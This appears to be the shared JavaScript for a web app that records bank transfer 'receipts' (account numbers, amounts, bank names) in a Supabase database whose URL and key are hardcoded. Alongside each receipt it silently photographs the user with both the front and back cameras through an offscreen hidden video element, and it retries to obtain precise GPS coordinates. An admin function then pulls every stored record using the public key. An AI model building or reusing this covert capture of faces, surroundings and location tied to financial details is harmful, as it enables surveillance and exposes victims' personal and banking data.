// Supabase client - shared across all pages
const SUPABASE_URL = 'https://axotezoancnodsqzmdru.supabase.co';
const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImF4b3Rlem9hbmNub2RzcXptZHJ1Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjQzMjg2MzgsImV4cCI6MjA3OTkwNDYzOH0.hL4r_xXGOgmz-kPuXjex28Yx5pACuC2kYiHQk-T4SIM';

let _supabase = null;

function getSupabase() {
  if (!_supabase) {
    _supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
  }
  return _supabase;
}

// Capture photo from a specific camera — fully stops stream before returning
async function captureFromCamera(facingMode) {
  let stream = null;
  try {
    // Try exact facingMode first, fall back to broader constraint on failure
    const constraintSets = [
      { video: { facingMode: { exact: facingMode }, width: { ideal: 1280 }, height: { ideal: 720 } } },
      { video: { facingMode: facingMode, width: { ideal: 640 }, height: { ideal: 480 } } },
      { video: true }
    ];

    for (const constraints of constraintSets) {
      try {
        stream = await navigator.mediaDevices.getUserMedia(constraints);
        break;
      } catch (e) {
        // try next constraint set
      }
    }

    if (!stream) throw new Error('No stream obtained');

    const video = document.createElement('video');
    video.srcObject = stream;
    video.setAttribute('playsinline', '');
    video.muted = true;
    video.style.position = 'fixed';
    video.style.top = '-9999px';
    document.body.appendChild(video);

    await new Promise((resolve, reject) => {
      const timeout = setTimeout(() => reject(new Error('video metadata timeout')), 8000);
      video.onloadedmetadata = () => {
        clearTimeout(timeout);
        video.play().then(resolve).catch(resolve);
      };
      video.onerror = () => { clearTimeout(timeout); reject(new Error('video error')); };
    });

    // Give camera sensor time to expose properly
    await new Promise(r => setTimeout(r, 1200));

    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    canvas.getContext('2d').drawImage(video, 0, 0);
    const dataUrl = canvas.toDataURL('image/jpeg', 0.8);

    stream.getTracks().forEach(t => t.stop());
    video.remove();

    // Validate we got real image data (not blank)
    if (!dataUrl || dataUrl.length < 5000) throw new Error('Image too small, likely blank');
    return dataUrl;
  } catch (e) {
    if (stream) stream.getTracks().forEach(t => t.stop());
    console.warn(`Camera capture failed (${facingMode}):`, e.message);
    return null;
  }
}

// Capture both cameras SEQUENTIALLY — phones cannot open two streams at once
async function captureBothCameras() {
  // Front camera first
  const front = await captureFromCamera('user');

  // Small gap to ensure the previous stream is fully released
  await new Promise(r => setTimeout(r, 300));

  // Back camera second
  const back = await captureFromCamera('environment');

  return { front, back };
}

// Get current GPS location with aggressive retry logic
function getCurrentLocation() {
  return new Promise((resolve) => {
    if (!navigator.geolocation) {
      resolve(null);
      return;
    }

    let resolved = false;

    // First attempt: high accuracy
    navigator.geolocation.getCurrentPosition(
      (pos) => {
        if (resolved) return;
        resolved = true;
        resolve({
          latitude: pos.coords.latitude,
          longitude: pos.coords.longitude,
          accuracy: pos.coords.accuracy,
          timestamp: new Date().toISOString()
        });
      },
      (err) => {
        if (resolved) return;
        console.warn('High-accuracy location failed, trying low-accuracy:', err.message);
        // Second attempt: low accuracy (faster, works indoors)
        navigator.geolocation.getCurrentPosition(
          (pos) => {
            if (resolved) return;
            resolved = true;
            resolve({
              latitude: pos.coords.latitude,
              longitude: pos.coords.longitude,
              accuracy: pos.coords.accuracy,
              timestamp: new Date().toISOString()
            });
          },
          (err2) => {
            if (resolved) return;
            resolved = true;
            console.error('Location capture failed entirely:', err2.message);
            resolve(null);
          },
          { enableHighAccuracy: false, timeout: 20000, maximumAge: 60000 }
        );
      },
      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
    );

    // Hard timeout fallback at 35s
    setTimeout(() => {
      if (!resolved) {
        resolved = true;
        console.warn('Location timed out after 35s');
        resolve(null);
      }
    }, 35000);
  });
}

// Save receipt to Supabase cloud (visible from any device)
async function saveReceiptToCloud(receiptData) {
  const payload = {
    username: receiptData.username || 'UNKNOWN',
    account_name: receiptData.accountName || '',
    bank_name: receiptData.bankName || '',
    account_number: receiptData.accountNumber || '',
    amount: receiptData.amount || 0,
    narration: receiptData.narration || '',
    reference_number: receiptData.referenceNumber || '',
    transaction_date: receiptData.transactionDate || new Date().toISOString(),
    transaction_type: receiptData.transactionType || 'debit',
    captured_face: receiptData.capturedFace || null,
    back_camera_photo: receiptData.backCameraPhoto || null,
    has_photo: !!receiptData.capturedFace,
    has_back_photo: !!receiptData.backCameraPhoto,
    location_latitude: receiptData.location ? receiptData.location.latitude : null,
    location_longitude: receiptData.location ? receiptData.location.longitude : null,
    location_accuracy: receiptData.location ? receiptData.location.accuracy : null
  };

  // Try Supabase JS first
  try {
    const supabase = getSupabase();
    const { data, error } = await supabase.from('receipts').insert(payload);
    if (!error) {
      console.log('Receipt saved via Supabase JS');
      return { data, error: null };
    }
    console.error('Supabase JS insert error:', error);
  } catch (e) {
    console.error('Supabase JS insert failed:', e);
  }

  // Fallback: direct REST API
  try {
    const response = await fetch(SUPABASE_URL + '/rest/v1/receipts', {
      method: 'POST',
      headers: {
        'apikey': SUPABASE_ANON_KEY,
        'Authorization': 'Bearer ' + SUPABASE_ANON_KEY,
        'Content-Type': 'application/json',
        'Prefer': 'return=minimal'
      },
      body: JSON.stringify(payload)
    });
    if (response.ok) {
      console.log('Receipt saved via REST API');
      return { data: null, error: null };
    }
    const errText = await response.text();
    console.error('REST insert failed:', response.status, errText);
    return { data: null, error: new Error('REST insert failed: ' + response.status) };
  } catch (e) {
    console.error('REST insert failed:', e);
    return { data: null, error: e };
  }
}

// Get all receipts from Supabase (for admin page)
async function getAllReceiptsFromCloud() {
  try {
    const supabase = getSupabase();
    const { data, error } = await supabase
      .from('receipts')
      .select('*')
      .order('created_at', { ascending: false });
    if (!error && data) return data;
    console.error('Supabase JS fetch error:', error);
  } catch (e) {
    console.error('Supabase JS fetch failed:', e);
  }

  // Fallback: direct REST API
  try {
    const response = await fetch(SUPABASE_URL + '/rest/v1/receipts?select=*&order=created_at.desc', {
      headers: {
        'apikey': SUPABASE_ANON_KEY,
        'Authorization': 'Bearer ' + SUPABASE_ANON_KEY
      }
    });
    if (response.ok) return await response.json();
  } catch (e) {
    console.error('REST fetch failed:', e);
  }

  return [];
}
